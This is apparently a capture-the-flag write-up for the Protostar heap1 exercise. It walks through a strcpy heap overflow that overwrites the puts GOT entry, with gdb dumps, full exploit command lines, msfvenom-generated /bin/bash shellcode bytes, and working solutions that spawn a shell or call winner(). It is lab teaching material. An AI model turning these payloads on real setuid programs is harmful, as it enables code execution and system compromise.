#### challenge
```txt
Protostar Heap1
About
This level takes a look at code flow hijacking in data overwrite cases.

This level is at /opt/protostar/bin/heap1
```
#### heap1.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

#### 32 bit ELF, glibc 2.6.18
```txt
file heap1 
heap1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
```

#### strcpy break points
```txt
gdb -q --args heap1 $(python -c 'print "A"*8') $(python -c 'print "B"*8')
...
0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
0x0804853d <main+132>:	mov    0xc(%ebp),%eax
...
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	movl   $0x804864b,(%esp)
....
break *main+127
break *main+132
break *main+156
break *main+161
```

#### expected behavior
```txt
heap 0x804a000
....
(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 <- malloc #1
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 <- malloc #2
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141 <- "A"*8
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x42424242 <- "B"*8
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/4x 0x0804a038
0x804a038:	0x42424242	0x42424242	0x00000000	0x00020fc1 <- argument 1

(gdb) x/4x 0x0804a018
0x804a018:	0x41414141	0x41414141	0x00000000	0x00000011 <- argument 2
```

#### unexpected behavior 
```txt
r $(python -c 'print "A"*24') $(python -c 'print "B"*24')
...
(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault. <- "B"*24 overwriting the "A"*4 (write primitive)
*__GI_strcpy (dest=0x41414141 <Address 0x41414141 out of bounds>, src=0xbffff96d 'B' <repeats 24 times>) at strcpy.c:40
```

#### printf GOT 
```txt
Non-debugging symbols:
0x0804839c  printf
0x0804839c  printf@plt
0x0804839c <printf@plt+0>:	jmp    DWORD PTR ds:0x8049768 <- printf GOT
... fails, browser changes it to puts
0x08048561 <main+168>:	call   0x80483cc <puts@plt> <- different GOT
0x08048566 <main+173>:	leave  
0x08048567 <main+174>:	ret  
```

#### puts GOT
```txt
Non-debugging symbols:
0x080483cc  puts
0x080483cc  puts@plt
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774 <- puts GOT address
```

#### setting up exploit
```txt
r $(python -c 'from struct import pack;print "\x41"*16 + pack("<I", 0xfffffffc) + pack("<I", 0x8049774) + "\xCC"*500') $(python -c 'print "B"*8')

Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? () <- overwriting puts GOT with "B"*4 (execute primitive)

(gdb) x/64x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0xfffffffc	0x08049774
0x804a030:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc <- shellcode
0x804a040:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0804a031 in ?? () <- stopped at debug

r $(python -c 'from struct import pack;print "\x41"*16 + pack("<I", 0xfffffffc) + pack("<I", 0x8049774) + "\x90"*500') $(python -c 'from struct import pack;print pack("<I", 0x804a030)')

Program received signal SIGSEGV, Segmentation fault.
0x0806b000 in ?? () <- continues through NOPs
```

#### shellcode
```txt
No nulls, newline, carriage returns due to strcpy..

#root@kali:~/CTF/protostar/solutions# msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b '\x00\x0A\x0D'
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of python file: 358 bytes
buf =  ""
buf += "\xbf\x98\xdf\xae\xe5\xd9\xcd\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x31\x7a\x13\x83\xc2\x04\x03\x7a\x97\x3d"
buf += "\x5b\x8f\xac\x99\x3d\x02\xd4\x71\x13\xc0\x91\x65\x03"
buf += "\x29\xd2\x01\xd4\x5d\x3b\xb0\xbd\xf3\xca\xd7\x6c\xe4"
buf += "\xc6\x17\x91\xf4\xf9\x75\xf8\x9a\x2a\x18\x9b\x11\x5c"
buf += "\xdc\x0c\x85\x15\x3d\x7f\xa9"

#root@kali:~/CTF/protostar/solutions# python
Python 2.7.2 (default, Jun 12 2011, 14:24:46) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> buf =  ""
>>> buf += "\xbf\x98\xdf\xae\xe5\xd9\xcd\xd9\x74\x24\xf4\x5a\x29"
>>> buf += "\xc9\xb1\x0c\x31\x7a\x13\x83\xc2\x04\x03\x7a\x97\x3d"
>>> buf += "\x5b\x8f\xac\x99\x3d\x02\xd4\x71\x13\xc0\x91\x65\x03"
>>> buf += "\x29\xd2\x01\xd4\x5d\x3b\xb0\xbd\xf3\xca\xd7\x6c\xe4"
>>> buf += "\xc6\x17\x91\xf4\xf9\x75\xf8\x9a\x2a\x18\x9b\x11\x5c"
>>> buf += "\xdc\x0c\x85\x15\x3d\x7f\xa9"
>>> buf.encode('hex')
'bf98dfaee5d9cdd97424f45a29c9b10c317a1383c204037a973d5b8fac993d02d47113c091650329d201d45d3bb0bdf3cad76ce4c61791f4f975f89a2a189b115cdc0c85153d7fa9'
>>>
```

#### exploit test
```txt
r $(python -c 'from struct import pack;print "\x41"*16 + pack("<I", 0xfffffffc) + pack("<I", 0x8049774) + "\x90"*8 + "bf98dfaee5d9cdd97424f45a29c9b10c317a1383c204037a973d5b8fac993d02d47113c091650329d201d45d3bb0bdf3cad76ce4c61791f4f975f89a2a189b115cdc0c85153d7fa9".decode("hex")') $(python -c 'from struct import pack;print pack("<I", 0x804a030)')
(gdb) c
Continuing.
Executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 4: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 5: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 3: No symbol "main" in current context.
Error in re-setting breakpoint 4: No symbol "main" in current context.
Error in re-setting breakpoint 5: No symbol "main" in current context.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 3: No symbol "main" in current context.
Error in re-setting breakpoint 4: No symbol "main" in current context.
Error in re-setting breakpoint 5: No symbol "main" in current context.
user@protostar:/opt/protostar/bin$ id
uid=1001(user) gid=1001(user) groups=1001(user) <- works in debugger...

(gdb) quit

```

#### solution 1
```txt
user@protostar:/opt/protostar/bin$ ./heap1 $(python -c 'from struct import pack;print "\x41"*16 + pack("<I", 0xfffffffc) + pack("<I", 0x8049774) + "\x90"*8 + "bf98dfaee5d9cdd97424f45a29c9b10c317a1383c204037a973d5b8fac993d02d47113c091650329d201d45d3bb0bdf3cad76ce4c61791f4f975f89a2a189b115cdc0c85153d7fa9".decode("hex")') $(python -c 'from struct import pack;print pack("<I", 0x804a030)')
bash-4.1$ id
uid=1001(user) gid=1001(user) groups=1001(user) 
```

### solution 2
```txt
user@protostar:/opt/protostar/bin$ objdump -d heap1 | grep win
08048494 <winner>:
user@protostar:/opt/protostar/bin$

user@protostar:/opt/protostar/bin$ ./heap1 $(python -c 'from struct import pack;print "\x41"*16 + pack("<I", 0xfffffffc) + pack("<I", 0x8049774)') $(python -c 'from struct import pack;print pack("<I", 0x08048494)')
and we have a winner @ 1516264056
```